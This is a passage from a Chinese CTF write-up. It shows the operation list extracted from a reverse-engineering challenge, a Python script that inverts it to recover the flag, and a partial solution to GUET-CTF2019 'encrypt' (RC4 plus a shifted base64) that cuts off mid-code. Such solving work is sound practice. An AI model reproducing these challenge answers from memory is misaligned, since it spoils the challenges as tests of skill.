class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br></pre></td><td class="code"><pre><span class="line">^&#x3D;0x91</span><br><span class="line">^&#x3D;0xCD</span><br><span class="line">^&#x3D;0x6A</span><br><span class="line">^&#x3D;0x59</span><br><span class="line">^&#x3D;0xA</span><br><span class="line">^&#x3D;0xF3</span><br><span class="line">^&#x3D;0xCA</span><br><span class="line">^&#x3D;0x3E</span><br><span class="line">^&#x3D;0x6C</span><br><span class="line">^&#x3D;0x4F</span><br><span class="line">^&#x3D;0x24</span><br><span class="line">^&#x3D;0x83</span><br><span class="line">^&#x3D;0xC4</span><br><span class="line">^&#x3D;0x53</span><br><span class="line">^&#x3D;4</span><br><span class="line">^&#x3D;0x9E</span><br><span class="line">^&#x3D;0x42</span><br><span class="line">^&#x3D;0xE</span><br><span class="line">^&#x3D;0x8D</span><br><span class="line">^&#x3D;0x38</span><br><span class="line">^&#x3D;0x7A</span><br><span class="line">^&#x3D;0xDD</span><br><span class="line">^&#x3D;0x52</span><br><span class="line">^&#x3D;0x1B</span><br><span class="line">^&#x3D;0xAA</span><br><span class="line">^&#x3D;0xAE</span><br><span class="line">^&#x3D;0xF8</span><br><span class="line">^&#x3D;0x58</span><br><span class="line">^&#x3D;0xF2</span><br><span class="line">^&#x3D;0x9F</span><br><span class="line">^&#x3D;0x3C</span><br><span class="line">^&#x3D;0xA1</span><br><span class="line">^&#x3D;6</span><br><span class="line">^&#x3D;0x78</span><br><span class="line">^&#x3D;0x70</span><br><span class="line">^&#x3D;0x28</span><br><span class="line">^&#x3D;0xEA</span><br><span class="line">^&#x3D;0x48</span><br><span class="line">^&#x3D;0xE4</span><br><span class="line">^&#x3D;0x6E</span><br><span class="line">^&#x3D;0x40</span><br><span class="line">^&#x3D;0x89</span><br><span class="line">^&#x3D;0x16</span><br><span class="line">^&#x3D;0xD7</span><br><span class="line">^&#x3D;0xB5</span><br><span class="line">^&#x3D;0xD</span><br><span class="line">^&#x3D;0x17</span><br><span class="line">^&#x3D;0x5A</span><br><span class="line">^&#x3D;0xB1</span><br><span class="line">^&#x3D;0x69</span><br><span class="line">^&#x3D;0x5C</span><br><span class="line">^&#x3D;0x21</span><br><span class="line">^&#x3D;0xE5</span><br><span class="line">^&#x3D;0x7E</span><br><span class="line">^&#x3D;0x2A</span><br><span class="line">^&#x3D;0x94</span><br><span class="line">^&#x3D;0xBC</span><br><span class="line">^&#x3D;1</span><br><span class="line">^&#x3D;0x74</span><br><span class="line">^&#x3D;0x57</span><br><span class="line">^&#x3D;0x6D</span><br><span class="line">^&#x3D;0x1E</span><br><span class="line">^&#x3D;0xA2</span><br><span class="line">^&#x3D;0x6B</span><br><span class="line">^&#x3D;0x22</span><br><span class="line">^&#x3D;0xC2</span><br><span class="line">^&#x3D;0x3D</span><br><span class="line">^&#x3D;0x44</span><br><span class="line">^&#x3D;0x90</span><br><span class="line">^&#x3D;0x8C</span><br><span class="line">^&#x3D;0xB3</span><br><span class="line">^&#x3D;0xA6</span><br><span class="line">^&#x3D;0x79</span><br><span class="line">^&#x3D;0x61</span><br><span class="line">^&#x3D;0xD9</span><br><span class="line">^&#x3D;0x5B</span><br><span class="line">^&#x3D;0x1A</span><br><span class="line">^&#x3D;0x43</span><br><span class="line">^&#x3D;0x8F</span><br><span class="line">^&#x3D;0xA5</span><br><span class="line">^&#x3D;0xEE</span><br><span class="line">^&#x3D;0x25</span><br><span class="line">^&#x3D;0x46</span><br><span class="line">^&#x3D;0xE6</span><br><span class="line">^&#x3D;0x88</span><br><span class="line">^&#x3D;0x20</span><br><span class="line">^&#x3D;0x71</span><br><span class="line">^&#x3D;0xE8</span><br><span class="line">^&#x3D;9</span><br><span class="line">^&#x3D;0x8A</span><br><span class="line">^&#x3D;0x7B</span><br><span class="line">^&#x3D;0xB4</span><br><span class="line">^&#x3D;0x19</span><br><span class="line">^&#x3D;0x15</span><br><span class="line">^&#x3D;0x4A</span><br><span class="line">^&#x3D;0x47</span><br><span class="line">^&#x3D;0xDB</span><br><span class="line">^&#x3D;0x72</span><br><span class="line">^&#x3D;0x5F</span><br><span class="line">^&#x3D;0x26</span><br><span class="line">^&#x3D;0xA7</span><br><span class="line">^&#x3D;0x8B</span><br><span class="line">^&#x3D;0xBA</span><br><span class="line">^&#x3D;0xBF</span><br><span class="line">^&#x3D;0x87</span><br><span class="line">^&#x3D;0x36</span><br><span class="line">^&#x3D;0x3F</span><br><span class="line">^&#x3D;0xFE</span><br><span class="line">^&#x3D;0x77</span><br><span class="line">^&#x3D;0x1C</span><br><span class="line">^&#x3D;0x81</span><br><span class="line">^&#x3D;0x11</span><br><span class="line">^&#x3D;0x2E</span><br><span class="line">^&#x3D;0x7C</span><br><span class="line">^&#x3D;0x63</span><br><span class="line">^&#x3D;0x45</span><br><span class="line">^&#x3D;0xF4</span><br><span class="line">^&#x3D;0x56</span><br><span class="line">^&#x3D;0xF1</span><br><span class="line">^&#x3D;0xB0</span><br><span class="line">^&#x3D;0xD1</span><br><span class="line">^&#x3D;0xE0</span><br><span class="line">^&#x3D;0xF</span><br><span class="line">^&#x3D;0x93</span><br><span class="line">^&#x3D;0xD6</span><br><span class="line">^&#x3D;0x1F</span><br><span class="line">^&#x3D;0xCC</span><br><span class="line">^&#x3D;0x4B</span><br><span class="line">^&#x3D;0xCF</span><br><span class="line">^&#x3D;0xDF</span><br><span class="line">^&#x3D;0x55</span><br><span class="line">^&#x3D;0xB9</span><br><span class="line">^&#x3D;0x2B</span><br><span class="line">^&#x3D;0x85</span><br><span class="line">^&#x3D;0x31</span><br><span class="line">^&#x3D;0x29</span><br><span class="line">^&#x3D;0xFD</span><br><span class="line">^&#x3D;0x3A</span><br><span class="line">^&#x3D;0x5E</span><br><span class="line">^&#x3D;0xDE</span><br><span class="line">^&#x3D;3</span><br><span class="line">^&#x3D;0xC6</span><br><span class="line">^&#x3D;0xC1</span><br><span class="line">^&#x3D;0xC5</span><br><span class="line">^&#x3D;0x54</span><br><span class="line">^&#x3D;0xBB</span><br><span class="line">^&#x3D;0xFC</span><br><span class="line">^&#x3D;0xBE</span><br><span class="line">^&#x3D;0xEC</span><br><span class="line">^&#x3D;0xC0</span><br><span class="line">^&#x3D;0xAD</span><br><span class="line">^&#x3D;0xA4</span><br><span class="line">^&#x3D;0xD0</span><br><span class="line">^&#x3D;0x35</span><br><span class="line">^&#x3D;0xB7</span><br><span class="line">^&#x3D;0x51</span><br><span class="line">^&#x3D;0xAB</span><br><span class="line">^&#x3D;0x2D</span><br><span class="line">^&#x3D;0xAF</span><br><span class="line">^&#x3D;0x92</span><br><span class="line">^&#x3D;0x60</span><br><span class="line">^&#x3D;0xAC</span><br><span class="line">^&#x3D;0x30</span><br><span class="line">^&#x3D;0xD4</span><br><span class="line">^&#x3D;0xCB</span><br><span class="line">^&#x3D;0x9B</span><br><span class="line">^&#x3D;0x9A</span><br><span class="line">^&#x3D;0xFB</span><br><span class="line">^&#x3D;0x6F</span><br><span class="line">^&#x3D;0xF7</span><br><span class="line">^&#x3D;0x8E</span><br><span class="line">^&#x3D;0xA0</span><br><span class="line">^&#x3D;0x27</span><br><span class="line">^&#x3D;0xC9</span><br><span class="line">+&#x3D;-128</span><br><span class="line">^&#x3D;0x7D</span><br><span class="line">^&#x3D;0x9D</span><br><span class="line">^&#x3D;0x1D</span><br><span class="line">^&#x3D;0xDA</span><br><span class="line">^&#x3D;0xD8</span><br><span class="line">^&#x3D;0xEB</span><br><span class="line">^&#x3D;0xF6</span><br><span class="line">^&#x3D;0xE3</span><br><span class="line">^&#x3D;0x98</span><br><span class="line">^&#x3D;0xE1</span><br><span class="line">^&#x3D;0x34</span><br><span class="line">^&#x3D;0x82</span><br><span class="line">^&#x3D;0x7F</span><br><span class="line">^&#x3D;0xD5</span><br><span class="line">^&#x3D;0xE7</span><br><span class="line">^&#x3D;0xB8</span><br><span class="line">^&#x3D;0xDC</span><br><span class="line">^&#x3D;0x97</span><br><span class="line">^&#x3D;0xA3</span><br><span class="line">^&#x3D;7</span><br><span class="line">^&#x3D;0xB6</span><br><span class="line">^&#x3D;0xB</span><br><span class="line">^&#x3D;0x14</span><br><span class="line">^&#x3D;0xCE</span><br><span class="line">^&#x3D;0x66</span><br><span class="line">^&#x3D;0x62</span><br><span class="line">^&#x3D;0xEF</span><br><span class="line">~</span><br><span class="line">^&#x3D;0xF9</span><br><span class="line">^&#x3D;0xA9</span><br><span class="line">^&#x3D;0x4E</span><br><span class="line">^&#x3D;0xD3</span><br><span class="line">^&#x3D;0xC7</span><br><span class="line">^&#x3D;0xE2</span><br><span class="line">^&#x3D;0xD2</span><br><span class="line">^&#x3D;0x33</span><br><span class="line">^&#x3D;0xA8</span><br><span class="line">^&#x3D;0x96</span><br><span class="line">^&#x3D;0xBD</span><br><span class="line">^&#x3D;0xC</span><br><span class="line">^&#x3D;0x13</span><br><span class="line">^&#x3D;0x2F</span><br><span class="line">^&#x3D;0x73</span><br><span class="line">^&#x3D;0x65</span><br><span class="line">^&#x3D;0x9C</span><br><span class="line">^&#x3D;0x12</span><br><span class="line">^&#x3D;2</span><br><span class="line">^&#x3D;0x32</span><br><span class="line">^&#x3D;0x10</span><br><span class="line">^&#x3D;0x84</span><br><span class="line">^&#x3D;0xED</span><br><span class="line">^&#x3D;0x95</span><br><span class="line">^&#x3D;0x4D</span><br><span class="line">^&#x3D;0x75</span><br><span class="line">^&#x3D;0x2C</span><br><span class="line">^&#x3D;0x5D</span><br><span class="line">^&#x3D;0x39</span><br><span class="line">^&#x3D;0x18</span><br><span class="line">^&#x3D;0x4C</span><br><span class="line">^&#x3D;0x49</span><br><span class="line">^&#x3D;0x37</span><br><span class="line">^&#x3D;0xF0</span><br><span class="line">^&#x3D;0x99</span><br><span class="line">^&#x3D;0x41</span><br><span class="line">^&#x3D;0x86</span><br><span class="line">^&#x3D;0x76</span><br><span class="line">^&#x3D;0xF5</span><br><span class="line">^&#x3D;5</span><br><span class="line">^&#x3D;0xC8</span><br><span class="line">^&#x3D;0x64</span><br><span class="line">^&#x3D;0xFA</span><br><span class="line">^&#x3D;0x50</span><br><span class="line">^&#x3D;0x3B</span><br><span class="line">^&#x3D;8</span><br><span class="line">^&#x3D;0xE9</span><br><span class="line">^&#x3D;0x23</span><br><span class="line">^&#x3D;0xC3</span><br><span class="line">^&#x3D;0x68</span><br><span class="line">^&#x3D;0x67</span><br><span class="line">+&#x3D;80</span><br><span class="line">+&#x3D;64</span><br><span class="line">+&#x3D;79</span><br><span class="line">+&#x3D;30</span><br><span class="line">+&#x3D;91</span><br><span class="line">+&#x3D;9</span><br><span class="line">+&#x3D;5</span><br><span class="line">+&#x3D;99</span><br><span class="line">+&#x3D;87</span><br><span class="line">+&#x3D;83</span><br><span class="line">+&#x3D;59</span><br><span class="line">+&#x3D;58</span><br><span class="line">++</span><br><span class="line">+&#x3D;90</span><br><span class="line">+&#x3D;57</span><br><span class="line">+&#x3D;65</span><br><span class="line">+&#x3D;53</span><br><span class="line">+&#x3D;41</span><br><span class="line">+&#x3D;85</span><br><span class="line">+&#x3D;89</span><br><span class="line">+&#x3D;44</span><br><span class="line">+&#x3D;70</span><br><span class="line">+&#x3D;12</span><br><span class="line">+&#x3D;84</span><br><span class="line">+&#x3D;10</span><br><span class="line">+&#x3D;74</span><br><span class="line">+&#x3D;17</span><br><span class="line">+&#x3D;38</span><br><span class="line">+&#x3D;43</span><br><span class="line">+&#x3D;33</span><br><span class="line">+&#x3D;11</span><br><span class="line">+&#x3D;94</span><br><span class="line">+&#x3D;86</span><br><span class="line">+&#x3D;55</span><br><span class="line">+&#x3D;32</span><br><span class="line">+&#x3D;97</span><br><span class="line">+&#x3D;68</span><br><span class="line">+&#x3D;50</span><br><span class="line">+&#x3D;67</span><br><span class="line">+&#x3D;71</span><br><span class="line">+&#x3D;96</span><br><span class="line">+&#x3D;56</span><br><span class="line">+&#x3D;6</span><br><span class="line">+&#x3D;73</span><br><span class="line">+&#x3D;52</span><br><span class="line">+&#x3D;42</span><br><span class="line">+&#x3D;61</span><br><span class="line">+&#x3D;69</span><br><span class="line">+&#x3D;14</span><br><span class="line">+&#x3D;75</span><br><span class="line">+&#x3D;4</span><br><span class="line">+&#x3D;40</span><br><span class="line">+&#x3D;37</span><br><span class="line">+&#x3D;15</span><br><span class="line">+&#x3D;77</span><br><span class="line">+&#x3D;2</span><br><span class="line">+&#x3D;23</span><br><span class="line">+&#x3D;62</span><br><span class="line">+&#x3D;29</span><br><span class="line">+&#x3D;49</span><br><span class="line">+&#x3D;47</span><br><span class="line">+&#x3D;27</span><br><span class="line">+&#x3D;66</span><br><span class="line">+&#x3D;82</span><br><span class="line">+&#x3D;46</span><br><span class="line">+&#x3D;19</span><br><span class="line">+&#x3D;88</span><br><span class="line">+&#x3D;63</span><br><span class="line">+&#x3D;39</span><br><span class="line">+&#x3D;35</span><br><span class="line">+&#x3D;25</span><br><span class="line">+&#x3D;51</span><br><span class="line">+&#x3D;18</span><br><span class="line">+&#x3D;92</span><br><span class="line">+&#x3D;95</span><br><span class="line">+&#x3D;3</span><br><span class="line">+&#x3D;72</span><br><span class="line">+&#x3D;48</span><br><span class="line">+&#x3D;36</span><br><span class="line">+&#x3D;93</span><br><span class="line">+&#x3D;76</span><br><span class="line">+&#x3D;22</span><br><span class="line">+&#x3D;98</span><br><span class="line">+&#x3D;81</span><br><span class="line">+&#x3D;13</span><br><span class="line">+&#x3D;45</span><br><span class="line">+&#x3D;34</span><br><span class="line">+&#x3D;78</span><br><span class="line">+&#x3D;26</span><br><span class="line">+&#x3D;54</span><br><span class="line">+&#x3D;28</span><br><span class="line">+&#x3D;31</span><br><span class="line">+&#x3D;20</span><br><span class="line">+&#x3D;16</span><br><span class="line">+&#x3D;7</span><br><span class="line">+&#x3D;24</span><br><span class="line">+&#x3D;60</span><br><span class="line">+&#x3D;21</span><br><span class="line">+&#x3D;8</span><br></pre></td></tr></table></figure>

4. 比对的数据在后面可以找到

5. 写脚本反处理

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">a = [<span class="number">0xd9</span>, <span class="number">0x2c</span>, <span class="number">0x27</span>, <span class="number">0xd6</span>, <span class="number">0xd8</span>, <span class="number">0x2a</span>, <span class="number">0xda</span>, <span class="number">0x2d</span>, <span class="number">0xd7</span>, <span class="number">0x2c</span>, <span class="number">0xdc</span>, <span class="number">0xe1</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xd9</span>, <span class="number">0xdd</span>, <span class="number">0x27</span>, <span class="number">0x2d</span>, <span class="number">0x2a</span>, <span class="number">0xdc</span>, <span class="number">0xdb</span>, <span class="number">0x2c</span>, <span class="number">0xe1</span>, <span class="number">0x29</span>, <span class="number">0xda</span>, <span class="number">0xda</span>, <span class="number">0x2c</span>, <span class="number">0xda</span>, <span class="number">0x2a</span>, <span class="number">0xd9</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">&#x27;1.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    ls = f.readlines()[::<span class="number">-1</span>]</span><br><span class="line">    print(len(ls))</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> ls:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> line:<span class="keyword">break</span></span><br><span class="line">       <span class="keyword">if</span> line[<span class="number">0</span>]==<span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]|=<span class="number">0x100</span></span><br><span class="line">                a[i]=~a[i]</span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;^=&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> len(line)&gt;<span class="number">4</span> <span class="keyword">and</span> line[<span class="number">2</span>:<span class="number">4</span>]==<span class="string">&#x27;0x&#x27;</span>:</span><br><span class="line">                num = line[<span class="number">4</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num = line[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]^=num</span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;++&#x27;</span>:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]+=<span class="number">0x100</span></span><br><span class="line">                a[i]-=<span class="number">1</span></span><br><span class="line">                a[i]&amp;=<span class="number">0xFF</span></span><br><span class="line">        <span class="keyword">elif</span> line[<span class="number">0</span>:<span class="number">2</span>]==<span class="string">&#x27;+=&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> len(line)&gt;<span class="number">4</span> <span class="keyword">and</span> line[<span class="number">2</span>:<span class="number">4</span>]==<span class="string">&#x27;0x&#x27;</span>:</span><br><span class="line">                num = line[<span class="number">4</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">16</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                num = line[<span class="number">2</span>:<span class="number">-1</span>]</span><br><span class="line">                num = int(num,<span class="number">10</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">                a[i]+=<span class="number">0x100</span></span><br><span class="line">                a[i]-=num</span><br><span class="line">                a[i]&amp;=<span class="number">0xFF</span></span><br><span class="line">    print(bytes(a))</span><br></pre></td></tr></table></figure>

也可以使用IDAPython处理，也可以angr符号执行= =

## [rev][GUET-CTF2019]encrypt

1. rc4加密

2. 类base64加密，只不过是加上61

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="comment"># from z3 import *</span></span><br><span class="line"></span><br><span class="line">tab = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">res =[ord(i)<span class="number">-61</span> <span class="keyword">for</span> i <span class="keyword">in</span>  <span class="string">r&#x27;Z`TzzTrD|fQP[_VVL|yneURyUmFklVJgLasJroZpHRxIUlH\vZE=&#x27;</span>]</span><br><span class="line">c = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(res)):</span><br><span class="line">    c+=tab[res[i]]</span><br><span class="line">c = c[:<span class="number">-1</span>]+<span class="string">&#x27;=&#x27;</span></span><br><span class="line">c = bytes(c,encoding=<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">print(c)</span><br><span class="line">c = base64.b64decode(c)</span><br><span class="line">print(c)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    print(hex(i),end=<span class="string">&quot;,&quot;</span>)</span><br><span class="line">print()</span><br><span class="line">key = [<span class="number">16</span>,<span class="number">32</span>,<span class="number">48</span>,<span class="number">48</span>,<span class="number">32</span>,<span class="number">32</span>,<span class="number">16</span>,<span class="number">64</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span 